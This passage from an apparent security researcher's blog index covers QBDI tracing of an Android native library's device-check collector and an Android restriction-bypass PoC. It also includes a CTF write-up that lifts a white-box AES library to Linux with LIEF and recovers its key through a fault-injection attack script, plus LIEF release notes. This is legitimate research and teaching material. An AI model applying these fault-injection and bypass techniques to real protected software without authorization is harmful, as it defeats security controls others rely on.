that QBDI is now able to resolve the effective memory address of instructions such as:\nLDR R0, [R1, R2]; # Resolve R1 + R2 STR R1, [R2, R3, LSL #2]; # Resolve R2 + R3 * 4 LDRB [PC, #4]; # Resolve **real** PC + 4 Moreover, QBDI is also able to get the effective memory value that is read or written. This feature is quite useful in the case of conditional instructions such as:\nITT LS; LDRLS R0, [R4]; LDRLS R1, [R0, #4] The effective value of R0 and R1 is stored in QBDI. It may not be *(r4) and *(r0 + 4) since the LS condition may not be verified.\nTo add a callback on memory accesses, we can use the addMemAccessCB(...) function on the VM instance:\nvm.addMemAccessCB(MEMORY_READ_WRITE, memory_callback, /* data */ nullptr); In the given memory_callback(...) function, we perform the following actions:\nTrack memory byte accesses. Check if the value is printable. Pretty print the R/W value. The idea of this callback is to track memory accesses that are performed on printable characters. It enables to quickly identify strings encoding/decoding routines.\nHere is the implementation of the callback:\nVMAction memory_callback(VMInstanceRef vm, GPRState *gprState, ...) { auto\u0026amp;\u0026amp; acc = vm-\u0026gt;getInstMemoryAccess(); // Get last memory access MemoryAccess maccess = acc.back(); // Retrieve access information: rword addr = maccess.accessAddress; // Address accessed rword value = maccess.value; // Value read or written rword size = maccess.size; // Access size // Only look for byte access if (size != sizeof(char)) { return VMAction::CONTINUE; } // Read / Write operation as a string const std::string kind = maccess.type == MemoryAccessType::MEMORY_READ ? \u0026#34;[R]\u0026#34; : \u0026#34;[W]\u0026#34;; // Cast the value into a char const char cvalue = static_cast\u0026lt;char\u0026gt;(value); // Check if the value read or written is printable if (::isprint(cvalue)) { logger-\u0026gt;info(\u0026#34;0x{:x} {}: {}\u0026#34;, addr, kind, cvalue); // Pretty print } // Continue this execution return VMAction::CONTINUE; } With this new callback, we can observe such output between two openat() syscalls involved in the root check routine:\nIt is basically the string decoding routine in action. Note that some read operations are missing since we only track printable characters. However all write operations are present.\nThe routine loads characters with the instruction at address 0x295e and stores the decoded value at address 0x2972. If we look at the function that handles these two addresses, we find the decoding routine:\nIn the above figure, the green section highlights the memory load access while the red one highlights the write operation. The blue area is the decoding logic.\nThe output of all read / write accesses turns out to be quite verbose on the whole execution of the function. We can improve the instrumentation by adding two callbacks before and after function calls with this purpose:\nBefore calls, we print the target address (e.g. 0x123: blx r3 -\u0026gt; .text!0xABC). After calls we print all printable characters being read or written within the called function. The addCallCB(...) is still in experimentation but it aims to put callbacks before or after call instructions:\n// Callback before ``call`` instructions vm.addCallCB(PRECALL, on_call_enter, nullptr); // Callback when a ``call`` returns vm.addCallCB(POSTCALL, on_call_exit, nullptr); With these two callbacks we get the following output:\nBy going further in the memory trace, we can observe this output:\nFrom this output we can infer the behavior of the collector (pseudo-code):\nf = open(\u0026#34;/proc/self/maps\u0026#34;) for line in f.readlines(): if not \u0026#34;/\u0026#34; in line: # Avoid entries such as XXX-YYY ... [anon:linker_alloc] continue if not \u0026#34;-xp\u0026#34; in line # Process executable segments only continue buffer += encode(line) We can also observe a sequence of\nREAD line[i] CALL .text!0xd2ba WRITE encoded(line[i]) It suggests that the logic of the encode() function is implemented at address 0xd2ba.\nThe CFG of this function is compounded by instructions that compare the input against magic printable values and we manually checked that it is the encoding function. Moreover this function is — by design — reversible since the server side algorithm needs to process the encoded data.\nLibrary lifting In the previous parts, we targeted the ARM version of the library. It turns out that SDKs which use native libraries usually provide the libraries for all architectures (arm, arm64, x86, x86-64).\nIndeed, they do not want to limit developers to some architectures. The solution previously analyzed also comes with a x86-64 version of libApp.so with the exact same interface.\nMoreover, the analysis done in the previous sections shows that there are no real dependencies to the Android system:\nSyscall are standards and available on Linux. /proc/self/maps and /proc/self/status are available on Linux. Thus, we can lift the library and run it on Linux. This technique has already been described in this blog post: When SideChannelMarvels meet LIEF.\nIn a first step, we have to patch the library with LIEF:\nimport lief libApp = lief.parse(\u0026#34;libApp.so\u0026#34;) # Patch library names # =================== libApp.get_library(\u0026#34;libc.so\u0026#34;).name = \u0026#34;libc.so.6\u0026#34; libApp.get_library(\u0026#34;liblog.so\u0026#34;).name = \u0026#34;libc.so.6\u0026#34; libApp.get_library(\u0026#34;libm.so\u0026#34;).name = \u0026#34;libm.so.6\u0026#34; libApp.get_library(\u0026#34;libdl.so\u0026#34;).name = \u0026#34;libdl.so.2\u0026#34; # Patch dynamic entries # ===================== # 1. Remove ELF constructors libApp[lief.ELF.DYNAMIC_TAGS.INIT_ARRAY].array = [] libApp[lief.ELF.DYNAMIC_TAGS.INIT_ARRAY].tag = lief.ELF.DYNAMIC_TAGS.DEBUG libApp[lief.ELF.DYNAMIC_TAGS.INIT_ARRAYSZ].value = 0 libApp[lief.ELF.DYNAMIC_TAGS.FINI_ARRAY].array = [] libApp[lief.ELF.DYNAMIC_TAGS.FINI_ARRAY].tag = lief.ELF.DYNAMIC_TAGS.DEBUG libApp[lief.ELF.DYNAMIC_TAGS.FINI_ARRAYSZ].value = 0 # 2. Remove symbol versioning libApp[lief.ELF.DYNAMIC_TAGS.VERNEEDNUM].tag = lief.ELF.DYNAMIC_TAGS.DEBUG libApp[lief.ELF.DYNAMIC_TAGS.VERNEED].tag = lief.ELF.DYNAMIC_TAGS.DEBUG libApp[lief.ELF.DYNAMIC_TAGS.VERDEFNUM].tag = lief.ELF.DYNAMIC_TAGS.DEBUG libApp[lief.ELF.DYNAMIC_TAGS.VERDEF].tag = lief.ELF.DYNAMIC_TAGS.DEBUG libApp[lief.ELF.DYNAMIC_TAGS.VERSYM].tag = lief.ELF.DYNAMIC_TAGS.DEBUG libApp.write(\u0026#34;libApp-x86-64.so\u0026#34;) Then, we can instantiate a Linux JVM and run the native function:\nint main() { JavaVM *jvm = nullptr; JNIEnv* env = nullptr; // JVM options JavaVMOption opt[1]; JavaVMInitArgs args; ... // JVM instantiation JNI_CreateJavaVM(\u0026amp;jvm, reinterpret_cast\u0026lt;void**\u0026gt;(\u0026amp;env), \u0026amp;args); // Load the library void* hdl = dlopen(\u0026#34;libApp-x86-64.so\u0026#34;, RTLD_LAZY | RTLD_LOCAL); // Resolve the functions using abi_t = jint(*)(JNIEnv*); using jni_func_t = jstring(*)(JNIEnv*); auto\u0026amp;\u0026amp; jni_get_abi = reinterpret_cast\u0026lt;abi_t\u0026gt;(dlsym(hdl, \u0026#34;Java_XXX_JNIWrapper_ca3_14007\u0026#34;)); auto\u0026amp;\u0026amp; jni_func = reinterpret_cast\u0026lt;jni_func_t\u0026gt;(dlsym(hdl, \u0026#34;Java_XXX_JNIWrapper_ca3_14008\u0026#34;)); // Execute jint abi = jni_get_abi(env); console-\u0026gt;info(\u0026#34;ABI: {:d}\u0026#34;, abi); jstring encoded = jni_func(env); console-\u0026gt;info(\u0026#34;ca3_14008(): {}\u0026#34;, env-\u0026gt;GetStringUTFChars(encoded, nullptr)); return EXIT_SUCCESS; } By executing this code, we get a similar output as seen in the previous parts:\nWe can also run the strace utility to inspect the syscalls:\nSince we are able to run the function on Linux, we could also use gdb, Intel PIN or QBDI(x86-64) to analyze the library.\nConclusion While it has been quite challenging to add the whole ARM support in QBDI, it starts to work pretty well on real use cases. Such support should also lead to interesting applications among which:\nHongFuzz / QBDI for Android. SideChannelMarvels integration for CPA attacks. Trustlets instrumentation. The raw traces used in this blog post are available here: traces.zip\nAcknowledgments Many thanks to Charles Hubain and Cédric Tessier who developed and designed QBDI. It is really pleasant to work on the concepts involved in this DBI.\nThanks to the LLVM community to provide such framework without which this project would not be possible.\nThanks to my Quarkslab colleagues who proofread this article.\nReferences Frida modifies fields of the art::ArtMethod object associated with the Java method.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSlides - Talk\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://github.com/QBDI/QBDI/blob/master/examples\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nDroidGuard being the SafetyNet module that collects information about the device.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThe name has been intentionally changed.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nPlus the this parameter which is a jclass object for a static method.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nEven though static analysis would be enough in this case.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nNexus 5X - Android 8.1.0 - Rooted with Magisk.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":155952e4,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"80507e111d02e96ebba18f081a8df969","permalink":"https://www.romainthomas.fr/post/android-native-library-analysis-with-qbdi/","publishdate":"2019-06-03T00:00:00Z","relpermalink":"/post/android-native-library-analysis-with-qbdi/","section":"post","summary":"This blog post deals with QBDI and how it can be used to reverse an Android JNI library","tags":["android","qbdi"],"title":"Android Native Library Analysis with QBDI","type":"post"},{"authors":["Romain Thomas"],"categories":null,"content":"PoC that demonstrates how to disable runtime restrictions (hidden-api and dlopen namespaces) in user-land.\nhttps://github.com/quarkslab/android-restriction-bypass ","date":1553644800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"d539026e0a71b974dd820beadbc99bf0","permalink":"https://www.romainthomas.fr/project/android-runtime-restrictions-bypass/","publishdate":"2019-03-27T00:00:00Z","relpermalink":"/project/android-runtime-restrictions-bypass/","section":"project","summary":"Android application that disables Android restrictions without root privileges","tags":["android"],"title":"Android Runtime Restrictions Bypass (PoC)","type":"project"},{"authors":["Romain Thomas"],"categories":null,"content":" Note This publication is also available on the Quarkslab Blog. With the release of Android Nougat, Google introduced restriction about native libraries that can be loaded from an Android application. Basically, it prevents developers to link against some internal libraries such as libart.so.\nLater on and with the release of Android Pie, they introduced a new restriction on the access to internal Java methods (or fields). Basically, these restrictions are used to prevent developers to access parts of the Android internal framework.\nWhereas these limitations aim to be used for compatibility purposes, this article shows how we can take advantage of Android internal to disable them. We briefly explain how these restrictions work and how to disable them from an application without privileges.\nThe first part deals with the native library loading restriction while the second is about Java internal framework restriction.\n","date":1553299200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1650903950,"objectID":"f66d0c032de15b286b9719768258637a","permalink":"https://www.romainthomas.fr/publication/android-restrictions-bypass/","publishdate":"2019-03-23T00:00:00Z","relpermalink":"/publication/android-restrictions-bypass/","section":"publication","summary":"This paper explains how to disable runtime restrictions without root privileges","tags":null,"title":"Android Runtime Restrictions Bypass","type":"publication"},{"authors":["Romain Thomas"],"categories":["Android","Challenge"],"content":" This post has been originally posted on the Quarkslab\u0026rsquo;s Blog Here is an Android crackme developed for the Android training given at Quarkslab.\nThe objective is to find the correct phone number that leads to the following message:\nThe application can be run on an emulator or a real device (whatever the architecture) but the Android version must be at least Marshmallow (\u0026gt; 6.0).\ncrackme-telegram.apk - SHA256: d66b82ebc14708b214a581760e99894af17e10598bcef95e75441a12b948bbf0\n","date":1542672e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"d724397d35a350dc535a41153c0ffe34","permalink":"https://www.romainthomas.fr/post/android-crackme/","publishdate":"2018-11-20T00:00:00Z","relpermalink":"/post/android-crackme/","section":"post","summary":"Android crackme that uses system's internals","tags":["android","challenge","crackme"],"title":"Android crackme challenge","type":"post"},{"authors":["Romain Thomas"],"categories":["Android"],"content":"Here are internal structures of Android OAT:\nOAT 124 PDF Version\nOAT 79 PDF Version\nOAT 64 PDF Version\n","date":1529884800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1650903950,"objectID":"cafaa1cdcbc4a0c195df4fe91329d011","permalink":"https://www.romainthomas.fr/post/android-oat/","publishdate":"2018-06-25T00:00:00Z","relpermalink":"/post/android-oat/","section":"post","summary":"Internal structures of OAT format","tags":["android","oat"],"title":"Android OAT formats","type":"post"},{"authors":["Romain Thomas"],"categories":["Android"],"content":"Here are internal structures of Android VDEX:\nVDEX 10 PDF Version\nVDEX 06 PDF Version\n","date":1529884800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1650903950,"objectID":"0253840aba4cfb0a98dbd91c16c8b583","permalink":"https://www.romainthomas.fr/post/android-vdex/","publishdate":"2018-06-25T00:00:00Z","relpermalink":"/post/android-vdex/","section":"post","summary":"Internal structures of VDEX format","tags":["android","vdex","format"],"title":"Android VDEX formats","type":"post"},{"authors":["Romain Thomas"],"categories":null,"content":"Many instrumentation techniques are based on modifying code or system environment of the target. It can be suitable for scenarios but it could not work under certain circumstance (integrity checking, non-rooted environment…) In this talk we propose similar techniques by only modifying the executable format. This enables to be architecture independent, injection and hooking does not require privileged environment.\n","date":1529452800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"8ad68419c7751ad4bcd1540adbaf29a9","permalink":"https://www.romainthomas.fr/publication/static-instrumentation/","publishdate":"2018-06-20T00:00:00Z","relpermalink":"/publication/static-instrumentation/","section":"publication","summary":"Talk given at Recon Montréal and PassTheSalt18 about static instrumentation and its use cases.","tags":null,"title":"Static Instrumentation Based on Executable Formats","type":"publication"},{"authors":["Philippe Teuwen","Romain Thomas"],"categories":["Android","LIEF"],"content":" This post has been originally posted on the Quarkslab\u0026rsquo;s Blog Introduction For those of you following our SideChannelMarvels1, you know that whenever we stumble on a non-commercial white-box implementation, we like to add it to the Deadpool project, a repository of various public white-box cryptographic implementations and their practical attacks.\nThis time, we wanted to have a look at the white-box created by Sanghwan (h2spice) Ahn and proposed during SECCON2016 CTF2. Apparently only PPP solved it during the competition and Sanghwan wrote himself a write-up3.\nThe challenge consists in an Android APK. When you launch it, it displays a flag encrypted a random number of times (between 1 and 3601). When encrypted only once, the flag is g1UlZafiuGdCgpTkWYjaZg3kE6qCd7kF3kV+nMKcGHc=.\nTo be able to ‘plug’ the challenge into our tools, we need to get an easy access to the input and output of the AES encryption function. A quick look reveals that the actual cryptographic operations are done in a native library called libnative-lib.so, conveniently available for several architectures. The function TfcqPqf1lNhu0DC2qGsAAeML0SEmOBYX4jpYUnyT8qYWIlEq(unsigned char*, unsigned char*) is the AES encryption function we want to attack. Note that the library is obfuscated with Obfuscator-LLVM 3.6.1, as we can see from its .comment section.\nBut we\u0026rsquo;re lazy, so we\u0026rsquo;d like to reuse the x86-64 version of libnative-lib.so under a Linux environment, where all the SideChannelMarvels toolchain is ready to crunch white-boxes. That\u0026rsquo;s not that simple because, even if they look alike, dynamic libraries compiled for Android or for Linux have a number of differences and a naive attempt to load an Android dynamic library under Linux will simply fail.\nFortunately, we have a nifty tool for parsing and modifying binaries. We\u0026rsquo;re talking about LIEF4 of course!\nConverting an Android library to Linux with LIEF The white-box is implemented in the libnative-lib.so which is available for ARM, AMR64, x86 and x86-64 architectures. It\u0026rsquo;s a tiny library exporting one JNI function: Java_kr_repo_h2spice_crypto500_MainActivity_a and importing three functions from external libraries.\nLifting this library to Linux is possible because the three imported functions (__cxa_finalize, __cxa_atexit, __stack_chk_fail) are not specific to Android.\nThe linked libraries of libnative-lib.so are standard: libc, libstdc++ \u0026hellip; except for liblog. But libnative-lib.so doesn\u0026rsquo;t use any of liblog functions, as we can see in readelf output:\n$ readelf -s -d -W ./libnative-lib.so Dynamic section at offset 0x2ad00 contains 31 entries: Tag Type Name/Value ... 0x01 (NEEDED) Shared library: [liblog.so] 0x01 (NEEDED) Shared library: [libm.so] 0x01 (NEEDED) Shared library: [libstdc++.so] 0x01 (NEEDED) Shared library: [libdl.so] 0x01 (NEEDED) Shared library: [libc.so] ... Symbol table \u0026#39;.dynsym\u0026#39; contains 32 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000 0 NOTYPE LOCAL DEFAULT UND 1: 00000 0 FUNC GLOBAL DEFAULT UND __cxa_finalize@LIBC (2) 2: 00000 0 FUNC GLOBAL DEFAULT UND __cxa_atexit@LIBC (2) 3: 04fe0 865 FUNC GLOBAL DEFAULT 11 Java_kr_repo_h2spice_crypto500_MainActivity_a 4: 02070 2281 FUNC GLOBAL DEFAULT 11 _Z48APtMDGO79Go3cbIkFca2rN0KszanZXOZ7dIPsxDBletW5gdoPcPKci 5: 01100 3916 FUNC GLOBAL DEFAULT 11 _Z48DENCPKY6hzMem3SuzgIXu4u6vxbF1sajPOJ75aN2VTdc7SCLPcPKc 6: 00bb0 1345 FUNC GLOBAL DEFAULT 11 _Z48KwUmSQBCaOVJKeqvABGpVnuErM7j8YCSOagNYBmr2ah0NZBePKc 7: 03860 6011 FUNC GLOBAL DEFAULT 11 _Z48TfcqPqf1lNhu0DC2qGsAAeML0SEmOBYX4jpYUnyT8qYWIlEqPhS_ 8: 02050 30 FUNC GLOBAL DEFAULT 11 _Z48h8AU0jPcyu9vXF9Kvg0bGDSl6H3TtcJIoOoU1ZOObCvegZ84i 9: 00000 0 FUNC GLOBAL DEFAULT UND __stack_chk_fail@LIBC (2) 10: 02960 3836 FUNC GLOBAL DEFAULT 11 _Z48lrsFdMdlAT0vSMVedxmqOkCBF7sCTbhCjYEp1rLP8vatWEGDPh 29: 2c008 0 NOTYPE GLOBAL DEFAULT ABS _edata 30: 2c008 0 NOTYPE GLOBAL DEFAULT ABS __bss_start 31: 2c050 0 NOTYPE GLOBAL DEFAULT ABS _end Thus we can simply remove the liblog library by setting its dynamic tag to DT_NULL:\n1 2 3 4 5 import lief libnative = lief.parse(\u0026#34;libnative-lib.so\u0026#34;) liblog = libnative.get_library(\u0026#34;liblog.so\u0026#34;) liblog.tag = lief.ELF.DYNAMIC_TAGS.NULL We also notice that the libc is named libc.so while the one on the current Linux version is named libc.so.6. To address this issue, one solution would be to create a symbol link of libc.so.6 to libc.so and set the environment variable LD_LIBRARY_PATH to the directory that contains the symlink.\nA more elegant solution is to rename the library with LIEF:\nlibnative.get_library(\u0026#34;libc.so\u0026#34;).name = \u0026#34;libc.so.6\u0026#34; Lastly, libnative-lib.so imports __cxa_finalize, __cxa_atexit and __stack_chk_fail with a specific version. The version can be seen in the imported names, next to the @ character. For these symbols, the associated version is \u0026ldquo;LIBC\u0026rdquo; and, during the loading step, the loader will look for the __cxa_finalize in libc.so.6 with this exact version.\nBut the Linux libc.so.6 defines these symbols with a \u0026ldquo;GLIBC_2.2.5\u0026rdquo; version:\n$ readelf -s -W /usr/lib64/libc.so.6|grep __cxa_finalize 1944: 00037cf0 535 FUNC GLOBAL DEFAULT 12 __cxa_finalize@@GLIBC_2.2.5 To fix the version issue, we can simply change the version to unspecified by setting its value to 1:\nfor s in filter(lambda e: e.has_version, libnative.dynamic_symbols): if s.symbol_version.value \u0026gt; 1: # Library-defined version s.symbol_version.value = 1 # Set to unspecified And then build the modified library:\nlibnative.write(\u0026#34;libnative-fixed.so\u0026#34;) Finally, we can load and execute the lifted library with dlopen / dlsym: (error handling being stripped for readability)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 using fnc_t = uint64_t(*)(unsigned char*, unsigned char*); int main(void) { void* h = dlopen(\u0026#34;./libnative-fixed.so\u0026#34;, RTLD_NOW); void* sh = dlsym(h, \u0026#34;_Z48TfcqPqf1lNhu0DC2qGsAAeML0SEmOBYX4jpYUnyT8qYWIlEqPhS_\u0026#34;); fnc_t AES_128_encrypt = reinterpret_cast\u0026lt;fnc_t\u0026gt;(sh); unsigned char plaintext[16]; unsigned char ciphertext[16]; fread(plaintext, 1, 16, stdin); AES_128_encrypt(plaintext, ciphertext); fwrite(ciphertext, 1, 16, stdout); return 0; } This native library has a special structure that enables the transformation:\nIt doesn\u0026rsquo;t use functions specific to Android. It doesn\u0026rsquo;t use packed relocations. It doesn\u0026rsquo;t use exceptions. It doesn\u0026rsquo;t use Thread Local Storage (TLS). The first point is very uncommon for JNI libraries and this transformation won\u0026rsquo;t be possible for usual libraries.\nEventually breaking the white-box Now that we got a Linux binary of the AES white-box with standardized input/output, we\u0026rsquo;re back into usual white-box attacks business. The Differential Fault Analysis attack on white-box using our tools is largely explained in a previous blogpost. In short, we inject statically some faults in the white-box tables (here, we\u0026rsquo;ll shoot on the entire .rodata section of the dynamic library), execute the AES on a constant input, and observe the output for faults. These steps are automated in the deadpool_dfa.Acquisition function, part of our SideChannelMarvels/Deadpool repository. Once we collected enough faulty outputs, we can apply a well-known DFA attack to recover the AES key, which is implemented in the phoenixAES.crack function from the SideChannelMarvels/JeanGrey repository.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import deadpool_dfa import phoenixAES def processinput(iblock, blocksize): return (bytes.fromhex(\u0026#39;%0*x\u0026#39; % (2*blocksize, iblock)), None) def processoutput(output, blocksize): return int.from_bytes(output, byteorder=\u0026#39;big\u0026#39;, signed=False) engine = deadpool_dfa.Acquisition( # main white-box executable targetbin=\u0026#39;./main64\u0026#39;, # file where to inject faults, and a reference copy targetdata=\u0026#39;./libnative-fixed.so\u0026#39;, goldendata=\u0026#39;./libnative-fixed.so.gold\u0026#39;, # hook to the DFA library, to validate faulty outputs dfa=phoenixAES, # hooks to process I/O as expected by the white-box executable processinput=processinput, processoutput=processoutput, # some tuning, telling we want to try up to single byte faults verbose=2, minleaf=1, minleafnail=1, # the libnative-fixed.so .rodata section address range addresses=[0x6350,0x2b490] ) outputs = engine.run()[0][0] phoenixAES.crack(outputs) Execution:\n... Lvl 016 [0x000226DF-0x000226E0[ xor 0x86 -\u0026gt; B25BE351AD6986FF15D1E152E7802EC7 GoodEncFault Column:1 Logged Lvl 016 [0x000226DF-0x000226E0[ xor 0x69 -\u0026gt; B235E351806986FF15D1E1A4E780A6C7 GoodEncFault Column:1 Logged Saving 17 traces in dfa_enc_20180427_112029-112038_17.txt Last round key #N found: 040D08DA68001026F3DC0D68897148B4 The DFA recovers the last (tenth) round key but the AES key schedule is invertible so we can go back to the original AES key:\n$ aes_keyschedule 040D08DA68001026F3DC0D68897148B4 10 K00: 6C2893F21B6185E8567238CB78184945 The key falls in 10.2s and 3300 executions. This is indeed the correct AES key:\n$ echo g1UlZafiuGdCgpTkWYjaZg3kE6qCd7kF3kV+nMKcGHc=|base64 -d|\\ openssl enc -d -aes-128-ecb -nopad -K 6C2893F21B6185E8567238CB78184945 SECCON{owSkwPeH1CHQdPV9KWrSmz9n} Final Words We hope this little exercise will make you feel like using our tools!\nThe whitebox and all the scripts to convert the library and apply the attack are available online 5 and LIEF has its own website4.\nThanks to all Quarkslab colleagues who proofread this article and provided valuable feedback.\nSide-Channel Marvels repository, on GitHub.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSECCON2016 Online CTF-Binary / Crypto500 Obfuscated AES, archived here.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSanghwan\u0026rsquo;s Obfuscated AES Write-Up, in english, korean and japanese\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nLibrary to Instrument Executable Formats\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSECCON 2016 Obfuscated AES artifacts in Deadpool\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":1525305600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"bd3c92041dc1c7e4c0ba7bb28e668f24","permalink":"https://www.romainthomas.fr/post/18-05-when-sidechannelmarvels-meets-lief/","publishdate":"2018-05-03T00:00:00Z","relpermalink":"/post/18-05-when-sidechannelmarvels-meets-lief/","section":"post","summary":"On how we used LIEF to lift an Android x86_64 library to Linux to perform our usual white-box attacks on it.","tags":[""],"title":"When SideChannelMarvels meets LIEF","type":"post"},{"authors":["Romain Thomas"],"categories":["LIEF","Android"],"content":"This post is a part of the LIEF tutorials. It explains how to combine Frida and LIEF to run frida-gadget on a non rooted device.\nSee more\n","date":1520035200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"07879a4dd6943de00d78e7d1ff0f0307","permalink":"https://www.romainthomas.fr/post/how-to-use-frida-on-a-non-rooted-device/","publishdate":"2018-03-03T00:00:00Z","relpermalink":"/post/how-to-use-frida-on-a-non-rooted-device/","section":"post","summary":"This post explains how to use Frida gadget on a non-rooted device.","tags":["lief"],"title":"How to use frida on a non-rooted device","type":"post"},{"authors":["Romain Thomas"],"categories":null,"content":" This post has been originally posted on the Quarkslab\u0026rsquo;s blog This blog post introduces new features of LIEF as well as some uses cases.\nTl;DR: LIEF v0.8.3 is out. The main changelog is available here and packages can be downloaded on the official website. To install the Python package:\n$ pip install lief Development process We attach a great importance to the automation of some development tasks like testing, distributing, packaging, etc. Here is a summary of these processes:\nEach commits is tested on\nLinux - x86-64 - Python{2.7, 3.5, 3.6} Windows - x86 / x86-64 - Python{2.7, 3.5, 3.6} OSX - x86-64 - Python{2.7, 3.5, 3.6} The test suite includes:\nTests on the Python API Tests on the C API Tests on the parsers Tests on the builders If tests succeeds packages are automatically uploaded on the https://github.com/lief-project/packages repository.\nFor tagged version, packages are uploaded on the Github release page: https://github.com/lief-project/LIEF/releases. Dockerlief\nDockerlief To facilitate the compilation and the use of LIEF, we created the Dockerlief repo which includes various Dockerfiles as well as the dockerlief utility. dockerlief is basically a wrapper on docker build .\nAmong Dockerfiles, we provide a Dockerfile to cross compile LIEF for Android (ARM, AARCH64, x86, x86-64)\nTo cross compile LIEF for Android ARM, one can run:\n$ dockerlief build --api-level 21 --arm lief-android [INFO] - Location of the Dockerfiles: ~/dockerfiles [INFO] - Building Dockerfile: \u0026#39;lief-android\u0026#39; [INFO] - Target architecture: armeabi-v7a [INFO] - Target API Level: 21 The SDK package LIEF-0.8.3-Android_API21_armeabi-v7a.tar.gz is automatically pulled from the Docker to the current directory.\nIntegration of LibFuzzer Fuzzing our own library is a good way to detect bugs, memory leak, unsanitized inputs \u0026hellip;\nThus, we integrated LibFuzzer in the project. Fuzzing the LIEF ELF, PE, Mach-O parser is as simple as:\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;LIEF/LIEF.hpp\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;memory\u0026gt; extern \u0026#34;C\u0026#34; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { std::vector\u0026lt;uint8_t\u0026gt; raw = {data, data + size}; try { std::unique_ptr\u0026lt;LIEF::Binary\u0026gt; b{LIEF::Parser::parse(raw)}; } catch (const LIEF::exception\u0026amp; e) { std::cout \u0026lt;\u0026lt; e.what() \u0026lt;\u0026lt; std::endl; } return 0; } To launch the fuzzer, one can run the following commands:\n$ make fuzz-elf # Launch ELF Fuzzer $ make fuzz-pe # Launch PE Fuzzer $ make fuzz-macho # Launch MachO Fuzzer $ make fuzz # Launch ELF, PE and MachO Fuzzer ELF Play with ELF symbols - Part 2 In the tutorial #03 we demonstrated how to swap dynamic symbols between a binary and a library. In this part, we will see how we can rename these symbols.\nChanging symbol names is not a trivial modification, since modifying the string table of the PT_DYNAMIC segment has side effects:\nIt requires to update the hash table (GNU Hash / SYSV). It usually requires to extend the DYNAMIC part of the ELF format. The previous version of LIEF already implements the rebuilding of the hash table but not the extending of the DYNAMIC part.\nWith the v0.8.3 we can extend the DYNAMIC part. Therefore:\nWe can add new entries in the .dynamic section We can change dynamic symbols names We can change DT_RUNPATH and DT_RPATH without length restriction We will rename all imported functions of gpg that are imported from libgcrypt.so.20 into a_very_long_name_of_function_XX and all exported functions of libgcrypt.so.20 into the same name (XX is the symbol index). 1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import lief # Load targets gpg = lief.parse(\u0026#34;/usr/bin/gpg\u0026#34;) libgcrypt = lief.parse(\u0026#34;/usr/lib/libgcrypt.so.20\u0026#34;) # Change names for idx, lsym in enumerate(filter(lambda e : e.exported, libgcrypt.dynamic_symbols)): new_name = \u0026#39;a_very_long_name_of_function_{:d}\u0026#39;.format(idx) print(\u0026#34;New name for \u0026#39;{}\u0026#39;: {}\u0026#34;.format(lsym.name, new_name)) for bsym in filter(lambda e : e.name == lsym.name, gpg.dynamic_symbols): bsym.name = new_name lsym.name = new_name # Write back binary.write(gpg.name) libgcrypt.write(libgcrypt.name) By using readelf we can check that function names have been modified:\n$ readelf -s ./gpg|grep \u0026#34;a_very_long_name\u0026#34; 2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND a_very_long_name_of_funct@GCRYPT_1.6 (2) 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND a_very_long_name_of_funct@GCRYPT_1.6 (2) 11: 0000000000000000 0 FUNC GLOBAL DEFAULT UND a_very_long_name_of_funct@GCRYPT_1.6 (2) 13: 0000000000000000 0 FUNC GLOBAL DEFAULT UND a_very_long_name_of_funct@GCRYPT_1.6 (2) ... $ readelf -s ./libgcrypt.so.20|grep \u0026#34;a_very_long_name\u0026#34; 88: 000000000000d050 6 FUNC GLOBAL DEFAULT 10 a_very_long_name_of_funct@@GCRYPT_1.6 89: 000000000000dcd0 69 FUNC GLOBAL DEFAULT 10 a_very_long_name_of_funct@@GCRYPT_1.6 90: 000000000000d310 34 FUNC GLOBAL DEFAULT 10 a_very_long_name_of_funct@@GCRYPT_1.6 91: 000000000000de70 81 FUNC GLOBAL DEFAULT 10 a_very_long_name_of_funct@@GCRYPT_1.6 ... Now if we run the new gpg binary, we get the following error:\n$ ./gpg --output bar.txt --symmetric ./foo.txt relocation error: ./gpg: symbol a_very_long_name_of_function_8, version GCRYPT_1.6 not defined in file libgcrypt.so.20 with link time reference Because the Linux loader tries to resolve the function a_very_long_name_of_function_8 against /usr/lib/libgcrypt.so.20 and that library doesn\u0026rsquo;t include the updated names we get the error.\nOne way to fix this error is to set the environment variable LD_LIBRARY_PATH to the current directory:\n$ LD_LIBRARY_PATH=. ./gpg --output bar.txt --symmetric ./foo.txt $ xxd ./bar.txt|head -n1 00000000: 8c0d 0407 0302 c5af 9fba cab1 9545 ebd2 .............E.. $ LD_LIBRARY_PATH=. ./gpg --output foo_decrypted.txt --decrypt ./bar.txt $ xxd ./foo_decrypted.txt|head -n1 00000000: 4865 6c6c 6f20 576f 726c 640a Hello World. Another way to fix it is to add 